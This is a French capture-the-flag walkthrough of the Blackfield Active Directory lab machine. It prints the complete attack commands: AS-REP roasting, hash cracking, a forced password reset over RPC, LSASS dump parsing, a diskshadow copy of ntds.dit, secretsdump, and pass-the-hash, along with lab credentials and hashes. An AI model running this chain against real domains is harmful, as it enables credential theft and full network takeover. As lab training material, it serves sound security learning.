![Cover](cover.png)

### Phase 1 : Reconnaissance & Brèche Initiale

L'objectif de cette phase est de cartographier la surface d'attaque de la machine **Blackfield** et d'identifier un vecteur d'entrée via l'énumération des services **Active Directory** classiques.

#### 1. Énumération des Services (Scanning)

Je débute par un scan **Nmap** exhaustif pour identifier les ports TCP ouverts, suivi d'un scan de services et de scripts par défaut.

```bash
# Scan TCP complet
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.192

# Scan de scripts et versions sur les ports identifiés
nmap -p 53,88,135,389,445,593,3268,5985 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.192

# Scan UDP rapide sur les ports critiques
nmap -sU -p 53,389 --min-rate 10000 10.10.10.192
```

**Résultats clés :**
*   **Port 53 (DNS) :** Le domaine est **BLACKFIELD.local**. Une tentative de **Zone Transfer (AXFR)** via `dig` échoue, ce qui est attendu sur un contrôleur de domaine sécurisé.
*   **Port 389/3268 (LDAP) :** Confirme le nom du domaine et le nom d'hôte **DC01**. L'énumération anonyme est restreinte (Bind requis pour lister les objets).
*   **Port 445 (SMB) :** Le service est ouvert. **CrackMapExec** confirme qu'il s'agit d'un **Windows 10.0 Build 17763** (Windows Server 2019).
*   **Port 88 (Kerberos) :** Présence indispensable pour une attaque de type **AS-REP Roasting**.

#### 2. Énumération SMB et Collecte de Usernames

En testant une **Null Connection** sur le service **SMB**, je découvre que le partage `profiles$` est accessible en lecture seule.

```bash
# Vérification des partages accessibles sans authentification
smbmap -H 10.10.10.192 -u null

# Exploration du partage profiles$
smbclient -N //10.10.10.192/profiles$
```

Le partage contient plus de 300 répertoires. Bien que les dossiers soient vides, leurs noms correspondent à des comptes utilisateurs du domaine. C'est une mine d'or pour une attaque par dictionnaire ou du **Password Spraying**. Je monte le partage localement pour extraire proprement cette liste.

```bash
mount -t cifs //10.10.10.192/profiles$ /mnt -o password=
ls -1 /mnt/ > users.txt
umount /mnt
```

> **Schéma Mental : De l'énumération anonyme à la liste d'utilisateurs**
>
> Accès Anonyme (SMB) ➔ Partage `profiles$` ➔ Noms de dossiers ➔ **User Enumeration** ➔ Préparation de l'attaque Kerberos.

#### 3. Vecteur d'Entrée : AS-REP Roasting

Avec une liste d'utilisateurs valides, je teste la vulnérabilité **AS-REP Roasting**. Cette attaque cible les comptes ayant l'attribut `UF_DONT_REQUIRE_PREAUTH` activé. Pour ces utilisateurs, le **KDC (Key Distribution Center)** envoie un ticket **AS-REP** chiffré avec le hash du mot de passe de l'utilisateur sans demander de pré-authentification.

```bash
# Utilisation de GetNPUsers d'Impacket pour tester la liste
for user in $(cat users.txt); do 
    GetNPUsers.py -no-pass -dc-ip 10.10.10.192 blackfield.local/$user | grep "krb5asrep"; 
done
```

Le script identifie l'utilisateur **support** comme étant vulnérable et récupère son hash **AS-REP**.

#### 4. Crackage de Hash et Validation

Je procède au crackage hors-ligne du hash récupéré en utilisant **Hashcat** avec la wordlist `rockyou.txt`.

```bash
# Crackage du hash Kerberos 5 AS-REP (Mode 18200)
hashcat -m 18200 support.hash /usr/share/wordlists/rockyou.txt --force
```

Le mot de passe est identifié : **#00^BlackKnight**.

Je valide les identifiants via **CrackMapExec** sur le protocole **SMB** pour confirmer l'accès.

```bash
crackmapexec smb 10.10.10.192 -u support -p '#00^BlackKnight'
```

**Résultat :** Authentification réussie (`[+] BLACKFIELD.local\support:#00^BlackKnight`). L'utilisateur n'a pas de droits d'administration directe (**Pwn3d!** absent), mais il possède désormais un accès authentifié pour une énumération plus profonde du domaine via **BloodHound** ou **LDAP**.

---

### Énumération des Utilisateurs & AS-REP Roasting

L'énumération initiale via une **Null Session** sur le partage SMB `profiles$` m'a permis de récupérer une liste massive de noms de répertoires, correspondant aux noms d'utilisateurs du domaine. Après avoir monté le partage et nettoyé la sortie, je dispose d'un fichier `users.txt` contenant plus de 300 entrées.

Je teste cette liste pour la vulnérabilité **AS-REP Roasting**. Cette attaque cible les comptes dont l'attribut `UF_DONT_REQUIRE_PREAUTH` est activé, permettant de demander un ticket Kerberos sans authentification préalable et de tenter un cassage hors-ligne de la partie chiffrée.

```bash
# Extraction des hashes AS-REP
for user in $(cat users.txt); do GetNPUsers.py -no-pass -dc-ip 10.10.10.192 blackfield.local/$user | grep krb5asrep; done

# Cassage du hash avec Hashcat
hashcat -m 18200 support.hash /usr/share/wordlists/rockyou.txt --force
```
**Credentials identifiés :** `support : #00^BlackKnight`

---

### Mouvement Latéral : De Support à Audit2020

Bien que le compte `support` n'ait pas d'accès **WinRM**, il possède des privilèges spécifiques au sein de l'**Active Directory**. J'utilise **BloodHound.py** pour cartographier les relations d'objets depuis ma machine Linux.

```bash
bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192
```

L'analyse des données dans l'interface **BloodHound** révèle que l'utilisateur `support` possède le privilège **ForceChangePassword** sur l'utilisateur `audit2020`. Ce droit permet de réinitialiser le mot de passe d'une cible sans connaître l'ancien, via **RPC**.

> **Schéma Mental : Exploitation d'ACL**
> Support -> [ForceChangePassword] -> Audit2020.
> L'attaque utilise l'interface **MS-SAMR** via **rpcclient** pour modifier l'attribut de mot de passe de l'objet cible directement sur le **Domain Controller**.

```bash
# Réinitialisation du mot de passe via rpcclient
rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.10.10.192 -c 'setuserinfo2 audit2020 23 "0xdf!!!"'
```
**Credentials mis à jour :** `audit2020 : 0xdf!!!`

---

### Analyse de Forensic & Extraction LSASS

En me connectant avec le compte `audit2020`, un nouveau partage SMB nommé `forensic` devient accessible. Ce partage contient des artefacts d'une analyse mémoire précédente, notamment des fichiers `.zip` contenant des dumps de processus.

Le fichier `lsass.zip` est particulièrement critique. Il contient un dump mémoire du processus **lsass.exe**, qui stocke souvent des credentials en cache (hashes NT, tickets Kerberos). J'utilise **pypykatz** pour parser ce fichier localement.

```bash
# Extraction et analyse du dump LSASS
unzip lsass.zip
pypykatz lsa minidump lsass.DMP
```

L'analyse extrait le **NT Hash** de l'utilisateur `svc_backup`. Ce compte dispose d'un accès **WinRM**, me permettant d'obtenir un shell stable.

**Credentials (Hash) :** `svc_backup : 9658d1d1dcd9250115e2205d9f48400d`

---

### Escalade de Privilèges : SeBackupPrivilege & NTDS.dit

L'utilisateur `svc_backup` est membre du groupe **Backup Operators** et possède le privilège **SeBackupPrivilege**. Ce droit est conçu pour permettre la sauvegarde de fichiers en ignorant les **DACL** (Access Control Lists), ce qui équivaut à un droit de lecture universel sur le système de fichiers.

Mon objectif est de récupérer le fichier `ntds.dit` (la base de données de l'AD) et la ruche **SYSTEM** pour extraire les hashes de tous les utilisateurs du domaine, y compris l'**Administrator**.

> **Schéma Mental : Bypassing File Locks**
> Le fichier `ntds.dit` est verrouillé par le système car il est constamment utilisé par le service **Active Directory Domain Services**. Pour le copier, il faut créer un **Volume Shadow Copy (VSS)**, qui permet de prendre un "instantané" du disque à un instant T, rendant les fichiers verrouillés accessibles en lecture.

J'utilise l'utilitaire **diskshadow** avec un script de configuration pour exposer une copie conforme du disque `C:` sur un nouveau lecteur `Z:`.

```powershell
# Contenu de vss.dsh (format DOS requis)
set context persistent nowriters
set metadata c:\programdata\df.cab
add volume c: alias df
create
expose %df% z:
```

Exécution de l'attaque :
```powershell
# Création du Shadow Copy
diskshadow /s c:\programdata\vss.dsh

# Copie des fichiers sensibles via les CmdLets SeBackupPrivilege
import-module .\SeBackupPrivilegeCmdLets.dll
Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit C:\programdata\ntds.dit
reg.exe save hklm\system C:\programdata\system.hive
```

Une fois les fichiers exfiltrés sur ma machine d'attaque, j'utilise **secretsdump.py** pour extraire les hashes.

```bash
secretsdump.py -system system.hive -ntds ntds.dit LOCAL
```

**Hash Administrator :** `184fb5e5178480be64824d4cd53b99ee`

L'accès final est obtenu via **Pass-The-Hash** sur le service **WinRM**.

```bash
evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
```

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois l'accès établi en tant que **svc_backup**, l'énumération des privilèges via `whoami /priv` révèle des vecteurs critiques. Ce compte possède la **SeBackupPrivilege** et la **SeRestorePrivilege**. Dans un environnement **Active Directory**, ces privilèges sont synonymes de compromission totale du **Domain Controller**.

#### 1. Abus de la SeBackupPrivilege

La **SeBackupPrivilege** permet de lire n'importe quel fichier sur le système, en ignorant les **Access Control Lists (ACL)** définies par le système de fichiers. L'objectif ici est d'extraire la base de données de l'**Active Directory** : le fichier `ntds.dit`.

> **Schéma Mental :**
> Privilège Backup -> Bypass des DACLs -> Accès aux fichiers sensibles (SAM, SYSTEM, NTDS.DIT) -> Extraction des Hashes de tout le domaine.

Cependant, le fichier `ntds.dit` est verrouillé par le processus `lsass.exe` car il est constamment utilisé par le système. Pour contourner ce verrouillage, j'utilise le service **Volume Shadow Copy (VSS)** via l'utilitaire **DiskShadow**.

#### 2. Extraction de la base NTDS via DiskShadow

Comme je n'ai pas d'accès interactif (GUI), je dois scripter **DiskShadow**. Je crée un fichier de configuration (`vss.dsh`) pour créer un instantané du disque `C:`, l'exposer sur une nouvelle lettre de lecteur (`Z:`), puis copier les fichiers nécessaires.

```powershell
# Contenu de vss.dsh (Format DOS requis via unix2dos)
set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
add volume c: alias df
create
expose %df% z:

# Exécution de DiskShadow
diskshadow /s c:\programdata\vss.dsh
```

Une fois le **Shadow Copy** monté sur `Z:`, j'utilise des outils spécifiques pour copier le fichier tout en conservant les privilèges de backup. J'utilise les DLL de `SeBackupPrivilegeCmdLets`.

```powershell
# Import des modules d'exploitation
import-module .\SeBackupPrivilegeCmdLets.dll
import-module .\SeBackupPrivilegeUtils.dll

# Copie du NTDS.DIT et extraction de la ruche SYSTEM pour le déchiffrement
Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit C:\programdata\ntds.dit
reg.exe save hklm\system C:\programdata\system.hive
```

#### 3. Extraction des Hashes et Pass-the-Hash

Avec `ntds.dit` et `system.hive` exfiltrés sur ma machine d'attaque, j'utilise **secretsdump.py** de la suite **Impacket** pour dumper les hashes **NTLM** de tous les utilisateurs du domaine, y compris l'**Administrator**.

```bash
secretsdump.py -system system.hive -ntds ntds.dit LOCAL
# Résultat : Administrator:500:aad3...:184fb5e5178480be64824d4cd53b99ee:::
```

Il ne reste plus qu'à effectuer une attaque **Pass-the-Hash** pour obtenir un shell **SYSTEM** via **Evil-WinRM**.

```bash
evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
```

---

### Analyse Post-Exploitation "Beyond Root"

#### Le mystère du root.txt et l'EFS
Lors de l'utilisation de la **SeBackupPrivilege**, une tentative de lecture directe de `C:\Users\Administrator\Desktop\root.txt` échoue avec un message "Access Denied", ce qui est paradoxal pour un privilège de backup. L'analyse montre que le fichier est protégé par l'**Encrypting File System (EFS)**.

> **Schéma Mental :**
> SeBackupPrivilege (Bypass ACL) != EFS Decryption (Cryptographie). Le privilège permet de copier le bloc de données chiffré, mais pas de lire son contenu en clair sans la clé privée de l'utilisateur.

#### Le script Watcher.ps1
Un script de persistance/protection nommé `watcher.ps1` tourne en boucle sur la machine. Sa fonction est de surveiller la date de modification de `root.txt`. Si le fichier est modifié (par exemple, lors d'une rotation de flag par la plateforme HTB), le script force immédiatement son chiffrement via la méthode `.Encrypt()`.

```powershell
$file = "C:\Users\Administrator\Desktop\root.txt"
$command = "(Get-Item -Path $file).Encrypt()"
# ... boucle de surveillance ...
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { $command }
```

Cette configuration explique pourquoi même avec des privilèges de backup, l'accès au flag nécessite impérativement la compromission du compte **Administrator** pour obtenir le contexte cryptographique nécessaire au déchiffrement transparent d'**EFS**.